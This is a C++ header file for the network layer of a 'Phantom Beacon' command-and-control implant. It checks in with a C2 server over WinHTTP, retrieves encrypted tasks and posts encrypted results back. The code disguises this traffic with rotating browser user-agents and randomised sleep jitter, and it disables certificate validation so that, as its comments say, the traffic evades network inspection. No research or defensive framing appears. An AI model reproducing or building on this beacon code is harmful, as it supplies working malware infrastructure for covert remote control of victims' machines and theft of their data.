#pragma once
// ============================================================================
//  network.h — Phantom Beacon Network Layer
//  ──────────────────────────────────────────
//  HTTPS communication with the C2 server using WinHTTP.
//  Traffic appears as standard HTTPS — indistinguishable from browser traffic
//  to network inspection tools.
// ============================================================================

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <winhttp.h>
#include <string>
#include <cstdlib>
#include <ctime>

#include "crypto.h"

#pragma comment(lib, "winhttp.lib")

namespace net {

// ── Configuration ──────────────────────────────────────────────────────────
// These will be patched at compile time or set via config.
struct C2Config {
    std::wstring host      = L"127.0.0.1";
    int          port      = 443;
    bool         use_https = false;    // Set to true for production
    int          sleep_ms  = 5000;     // Base sleep interval (ms)
    int          jitter    = 30;       // Jitter percentage (0-100)
    std::string  beacon_id;            // Unique agent identifier

    // Calculate actual sleep with jitter
    int get_sleep_ms() const {
        if (jitter <= 0) return sleep_ms;
        int variation = (sleep_ms * jitter) / 100;
        // Simple random without pulling in <random> (lighter binary)
        int offset = (rand() % (2 * variation + 1)) - variation;
        return max(1000, sleep_ms + offset);  // Minimum 1 second
    }
};

// ── User-Agent Rotation ────────────────────────────────────────────────────
// Rotate through common browser user-agents to blend in with normal traffic.

static const wchar_t* USER_AGENTS[] = {
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
};
constexpr int NUM_USER_AGENTS = sizeof(USER_AGENTS) / sizeof(USER_AGENTS[0]);

inline const wchar_t* get_random_ua() {
    return USER_AGENTS[rand() % NUM_USER_AGENTS];
}

// ── HTTP Request Helper ────────────────────────────────────────────────────

inline std::string http_request(
    const C2Config& cfg,
    const std::wstring& method,   // L"GET" or L"POST"
    const std::wstring& path,     // e.g. L"/api/v1/ping"
    const std::string& body = "", // POST body (encrypted)
    const std::string& beacon_id = ""
) {
    std::string response_body;

    HINTERNET hSession = WinHttpOpen(
        get_random_ua(),
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return "";

    HINTERNET hConnect = WinHttpConnect(
        hSession,
        cfg.host.c_str(),
        static_cast<INTERNET_PORT>(cfg.port), 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return ""; }

    DWORD flags = cfg.use_https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        method.c_str(),
        path.c_str(),
        nullptr,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        flags);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return "";
    }

    // If HTTPS with self-signed cert, ignore certificate errors (dev mode)
    if (cfg.use_https) {
        DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                         SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                         SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
    }

    // Add custom headers
    std::wstring headers = L"Content-Type: text/plain\r\n";
    if (!beacon_id.empty()) {
        // Convert beacon_id to wide string for header
        std::wstring wid(beacon_id.begin(), beacon_id.end());
        headers += L"X-Beacon-Id: " + wid + L"\r\n";
    }

    BOOL bResult = WinHttpSendRequest(
        hRequest,
        headers.c_str(),
        static_cast<DWORD>(headers.length()),
        body.empty() ? WINHTTP_NO_REQUEST_DATA : (LPVOID)body.c_str(),
        static_cast<DWORD>(body.size()),
        static_cast<DWORD>(body.size()),
        0);
    if (!bResult) goto cleanup;

    bResult = WinHttpReceiveResponse(hRequest, nullptr);
    if (!bResult) goto cleanup;

    // Read response body
    {
        DWORD dwSize = 0;
        do {
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
            if (dwSize == 0) break;

            std::vector<char> buffer(dwSize + 1, 0);
            DWORD dwDownloaded = 0;
            if (WinHttpReadData(hRequest, buffer.data(), dwSize, &dwDownloaded)) {
                response_body.append(buffer.data(), dwDownloaded);
            }
        } while (dwSize > 0);
    }

cleanup:
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return response_body;
}

// ── High-Level C2 Functions ────────────────────────────────────────────────

// Check in with the C2 server and retrieve pending tasks.
// Returns the decrypted JSON string with tasks, or "" on failure.
inline std::string checkin(const C2Config& cfg) {
    std::string encrypted_response = http_request(
        cfg, L"GET", L"/api/v1/ping", "", cfg.beacon_id);

    if (encrypted_response.empty()) return "";
    return crypto::decrypt(encrypted_response);
}

// Send an encrypted result back to the C2 server.
inline bool send_result(const C2Config& cfg, const std::string& task_id, const std::string& output) {
    // Build JSON payload
    std::string json = "{\"task_id\":\"" + task_id + "\",\"output\":\"";
    // Escape the output for JSON
    for (char c : output) {
        switch (c) {
            case '"':  json += "\\\""; break;
            case '\\': json += "\\\\"; break;
            case '\n': json += "\\n";  break;
            case '\r': json += "\\r";  break;
            case '\t': json += "\\t";  break;
            default:   json += c;      break;
        }
    }
    json += "\"}";

    std::string encrypted = crypto::encrypt(json);
    if (encrypted.empty()) return false;

    std::string resp = http_request(cfg, L"POST", L"/api/v1/result", encrypted, cfg.beacon_id);
    return !resp.empty();
}

}  // namespace net
